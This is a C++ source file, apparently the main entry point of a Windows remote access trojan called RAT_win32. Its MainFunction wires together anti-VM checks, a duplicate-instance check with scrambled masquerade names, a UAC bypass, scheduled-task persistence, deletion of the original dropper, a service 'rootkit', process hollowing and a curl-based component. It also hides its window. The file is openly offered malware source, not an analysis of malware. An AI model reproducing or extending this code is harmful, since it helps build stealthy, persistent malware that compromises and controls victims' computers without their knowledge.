// RAT_win32.cpp : Defines the entry point for the application.
//

#include "framework.h"
#include "RAT_win32.h"

#include <iostream>
#include "AntiVM.h"
#include "Tools.h"
#include "Bypass_UAC.h"
#include "ADS.h"
#include "Service.h"
#include "TaskScheduler.h"
#include "ProcessHollowing.h"
#include "CURL.h"

#define TESTING 1
#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);


int MainFunction()
{
	#ifndef LOG_OFF
		//std::cout << "RAT::main: Starting RAT\n";
		OutputDebugStringA("RAT::main: Starting RAT\n");
	#endif // !LOG_OFF

#ifndef TESTING
	/*
	if (ANTIVM::IsVMWare())
	{
		#ifndef LOG_OFF
			std::cout << "RAT::main: VMWare detected\n";
			OutputDebugStringA("RAT::main: VMWare detected\n");
		#endif // !LOG_OFF
		return 0;
	}
	*/
#endif // !TESTING

	#ifndef LOG_OFF
		std::cout << "RAT::main: Initializing Tools\n";
		OutputDebugStringA("RAT::main: Initializing Tools\n");
	#endif // !LOG_OFF

	// Initializing Tools
	Tools tool;
	#ifndef LOG_OFF
		std::cout << "RAT::main: Tools initialized\n";
		OutputDebugStringA("RAT::main: Tools initialized\n");
	#endif // !LOG_OFF

	// Check if the malware is already running
	if (tool.GetThisProgramPath().find(tool.decode("ecsSowndWiskTatyriu")) == std::string::npos && tool.GetThisProgramPath().find(tool.decode("p.elehex")) == std::string::npos) // decode -> WindowsSecurityTask , help.exe
	{
		if (tool.isProcessRunning(tool.GetMyName() + "ecsSowndWik:asyTitur") || tool.isProcessRunning("p.elehex")) // decode -> :WindowsSecurityTask, help.exe
		{
			#ifndef LOG_OFF
				std::cout << "RAT::main: Malware already running\n";
				OutputDebugStringA("RAT::main: Malware already running\n");
			#endif // !LOG_OFF
			return 0;
		}

		// Sleep(11000); //// is it good idea?? (Anti-Windows-Defender-Technique)
	}

	#ifndef LOG_OFF
		std::cout << "RAT::main: Malware not running\n";
		OutputDebugStringA("RAT::main: Malware not running\n");
	#endif // !LOG_OFF

	// Hide Files
	ADS ads;

	// Bypass UAC
	BypassUAC uac;
	if (!uac.IsProcessElevated())
		if (uac.UAC())
			return 1;

	// Create Task RAT && Delete the original Malware
	if (uac.IsProcessElevated())
	{
		TaskScheduler sch;
		if (sch.isTaskExists(tool.HIDE_NAME))
			ads.DeleteTheOriginalMalware();
	}

	// Create and Start Service Rootkit
	if (uac.IsProcessElevated())
		Service service;

	// Process Hollowing (64-bit)
	if (!tool.isSystem32Bit() && tool.GetThisProgramPath().find(tool.decode("p.elehex")) == std::string::npos)
		ProcessHollowing ph;

	// Initializing CURL
	Curl curl;

	return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_RATWIN32, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    // Call MainFunction here
    MainFunction();

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_RATWIN32));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_RATWIN32));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_RATWIN32);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    hInst = hInstance; // Store instance handle in our global variable

    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

    if (!hWnd)
    {
        return FALSE;
    }

    // Hide the window
    ShowWindow(hWnd, SW_HIDE);
    UpdateWindow(hWnd);

    return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}